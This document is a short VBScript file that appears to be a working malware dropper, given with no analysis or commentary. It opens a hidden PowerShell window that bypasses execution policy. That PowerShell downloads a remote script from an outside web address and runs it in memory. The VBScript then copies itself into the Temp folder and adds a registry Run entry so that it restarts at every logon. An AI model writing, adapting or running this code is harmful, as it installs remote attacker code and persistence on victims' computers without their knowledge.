const CONSOLE_HIDE=0
const CONSOLE_SHOW=1
const CMD_WAIT=true
set oShell = wscript.createObject("WScript.Shell")
oShell.run "cmd /c cmd /c powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -command [System.Net.WebClient]$webClient = New-Object System.Net.WebClient;[System.IO.Stream]$stream = $webClient.OpenRead('http://www.lizen-pierre.be/user.ps1');[System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $stream;[string]$results = $sr.ReadToEnd();IEX $results; hackbacktrack", CONSOLE_HIDE, CMD_WAIT
on error resume Next
Set C = CreateObject("Scripting.FileSystemObject")
C.copyfile WScript.ScriptFullName , CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") & "\X.vbs"
Dim A
A = "powershell -windowstyle hidden ( New-ItemProperty -Path " & """" & "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" & """" & " -Name " & """" & "$NAME$" & """" & " -Value " & """" & "$PATH$" & """" & " )"
Set B = CreateObject("Wscript.shell")
PATH = B.ExpandEnvironmentStrings("%Temp%") & "\X.vbs"
A = replace(replace(A,"$PATH$",PATH),"$NAME$","X")
B.Run A,0